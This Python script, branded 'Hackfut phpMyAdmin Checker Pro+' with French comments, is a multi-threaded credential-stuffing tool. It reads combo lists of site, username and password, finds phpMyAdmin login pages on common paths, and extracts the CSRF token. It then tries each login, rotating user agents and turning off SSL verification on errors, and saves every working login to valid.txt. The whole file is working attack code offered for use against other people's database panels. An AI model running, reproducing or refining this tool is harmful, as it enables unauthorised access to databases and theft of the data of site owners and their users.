#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Hackfut phpMyAdmin Checker Pro+
Advanced phpMyAdmin Credential Verification Tool
Contact: @HackfutS3c
"""

import requests
import os
import re
import sys
import random
import argparse
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init
from datetime import datetime
import socket
import ssl

# Initialisation
init(autoreset=True)
socket.setdefaulttimeout(10)

# Configuration
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15'
]

COMMON_PATHS = [
    '/phpmyadmin/',
    '/pma/',
    '/myadmin/',
    '/dbadmin/',
    '/admin/phpMyAdmin/',
    '/mysql/',
    '/web/phpMyAdmin/',
    '/_phpmyadmin/'
]

FAILURE_INDICATORS = [
    "Cannot log in to the MySQL server",
    "Access denied for user",
    "Login without a password is forbidden",
    "Invalid token",
    "error #1045"
]

SUCCESS_INDICATORS = [
    "pma_navigation.php",
    "db_structure.php",
    "main.php",
    "server_sql.php"
]

def clear_screen():
    """Efface l'écran du terminal"""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    """Affiche la bannière stylisée"""
    banner = f"""
{Fore.RED}╦ ╦╔═╗╔═╗╔╦╗╔═╗╔╦╗╦ ╦╔═╗╦═╗
{Fore.RED}╠═╣║ ║╠═╝ ║║╠═╣ ║ ║ ║║ ║╠╦╝
{Fore.RED}╩ ╩╚═╝╩  ═╩╝╩ ╩ ╩ ╚═╝╚═╝╩╚═ {Fore.RESET}phpMyAdmin Checker Pro+

{Fore.CYAN}▪ Advanced Credential Verification
{Fore.CYAN}▪ Multi-Threaded Performance
{Fore.CYAN}▪ Auto Path Detection
{Fore.CYAN}▪ Smart Error Handling
{Fore.YELLOW}▪ Contact: @HackfutS3c
{Style.RESET_ALL}
    """
    print(banner)

def get_credentials_file():
    """Demande le fichier d'entrée avec validation"""
    while True:
        file_path = input(f"{Fore.CYAN}[?] Fichier d'entrée ({Fore.GREEN}ex: combos.txt{Fore.CYAN}): {Fore.WHITE}")
        if os.path.isfile(file_path):
            return file_path
        print(f"{Fore.RED}[!] Fichier introuvable. Réessayez.")

def validate_site(site):
    """Valide et normalise l'URL"""
    if not re.match(r'^https?://', site, re.I):
        site = f"http://{site}"
    
    parsed = urlparse(site)
    if not parsed.netloc:
        return None
    
    return parsed.geturl()

def detect_phpmyadmin(base_url):
    """Détection automatique du chemin phpMyAdmin"""
    for path in COMMON_PATHS:
        try:
            test_url = urljoin(base_url, path)
            response = requests.head(
                test_url,
                headers={'User-Agent': random.choice(USER_AGENTS)},
                timeout=10,
                allow_redirects=True
            )
            if response.status_code == 200:
                return test_url
        except:
            continue
    return None

def check_credentials(target, username, password):
    """Vérifie les identifiants phpMyAdmin"""
    try:
        # Normalisation de l'URL
        if not target.startswith(('http://', 'https://')):
            target = f"http://{target}"
        
        # Détection automatique du chemin
        if not any(p in target.lower() for p in ['phpmyadmin', 'pma']):
            detected_path = detect_phpmyadmin(target)
            if detected_path:
                target = detected_path
            else:
                return False, "phpMyAdmin path not found"
        
        # Session pour maintenir les cookies
        session = requests.Session()
        session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
        
        # Récupération du token CSRF
        login_page = session.get(
            urljoin(target, 'index.php'),
            timeout=15,
            allow_redirects=False
        )
        
        # Extraction du token
        token_match = re.search(r'name="token" value="([a-f0-9]+)"', login_page.text)
        token = token_match.group(1) if token_match else ''
        
        # Données de connexion
        post_data = {
            'pma_username': username,
            'pma_password': password,
            'server': '1',
            'token': token,
            'input_go': 'Go'
        }
        
        # Tentative de connexion
        response = session.post(
            urljoin(target, 'index.php'),
            data=post_data,
            timeout=15,
            allow_redirects=False
        )
        
        # Analyse de la réponse
        if response.status_code == 302:
            return True, "Login successful (302 redirect)"
        
        content = response.text.lower()
        if any(indicator in content for indicator in [s.lower() for s in SUCCESS_INDICATORS]):
            return True, "Login successful (content match)"
        
        if any(error in content for error in [f.lower() for f in FAILURE_INDICATORS]):
            return False, "Invalid credentials"
        
        return False, "Unknown response"
        
    except requests.exceptions.SSLError:
        # Retry with SSL verification disabled
        try:
            session.verify = False
            response = session.post(
                urljoin(target, 'index.php'),
                data=post_data,
                timeout=15,
                allow_redirects=False
            )
            if response.status_code == 302:
                return True, "Login successful (SSL bypass)"
            return False, "SSL error bypassed but login failed"
        except Exception as e:
            return False, f"SSL error: {str(e)}"
            
    except Exception as e:
        return False, f"Connection error: {str(e)}"

def process_credential(line):
    """Traite une ligne de credentials"""
    try:
        # Support multiple formats
        if '|' in line:
            parts = line.strip().split('|')
        elif ':' in line:
            parts = line.strip().split(':')
        else:
            parts = line.strip().split()
            
        if len(parts) < 3:
            return None, "Invalid format", None, None
            
        target = validate_site(parts[0].strip())
        if not target:
            return None, "Invalid URL", None, None
            
        username = parts[1].strip()
        password = ':'.join(parts[2:]).strip() if ':' in line else ' '.join(parts[2:]).strip()
        
        return target, username, password, line
        
    except Exception as e:
        return None, f"Parse error: {str(e)}", None, None

def worker(line):
    """Fonction exécutée par chaque thread"""
    target, username, password, original = process_credential(line)
    if not target:
        return original, False, "Invalid input"
    
    status, message = check_credentials(target, username, password)
    return original, status, message

def main():
    clear_screen()
    print_banner()
    
    # Configuration des arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-f", "--file", help="Fichier d'entrée contenant les identifiants")
    parser.add_argument("-t", "--threads", type=int, default=20, help="Nombre de threads (défaut: 20)")
    parser.add_argument("-o", "--output", default="valid.txt", help="Fichier de sortie (défaut: valid.txt)")
    args = parser.parse_args()
    
    # Récupération du fichier d'entrée
    input_file = args.file if args.file else get_credentials_file()
    
    try:
        with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
            credentials = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"{Fore.RED}[!] Erreur de lecture du fichier: {str(e)}{Style.RESET_ALL}")
        sys.exit(1)
    
    print(f"\n{Fore.YELLOW}[*] Chargement de {len(credentials)} combinaisons...")
    print(f"{Fore.YELLOW}[*] Utilisation de {args.threads} threads...")
    print(f"{Fore.YELLOW}[*] Démarrage du scan...\n")
    
    valid_count = 0
    processed = 0
    
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {executor.submit(worker, line): line for line in credentials}
        
        for future in as_completed(futures):
            original, status, message = future.result()
            processed += 1
            
            # Affichage du résultat
            timestamp = datetime.now().strftime("%H:%M:%S")
            if status:
                print(f"{Fore.GREEN}[+] {timestamp} VALIDE: {original}")
                valid_count += 1
                with open(args.output, 'a', encoding='utf-8') as out:
                    out.write(f"{original}\n")
            else:
                print(f"{Fore.RED}[-] {timestamp} ECHEC: {original} | {message}")
            
            # Affichage de la progression
            if processed % 100 == 0 or processed == len(credentials):
                print(f"{Fore.CYAN}[*] Progression: {processed}/{len(credentials)} | Valides: {valid_count}")
    
    print(f"\n{Fore.GREEN}[+] Scan terminé! {valid_count} combinaisons valides sauvegardées dans {args.output}")

if __name__ == "__main__":
    main()
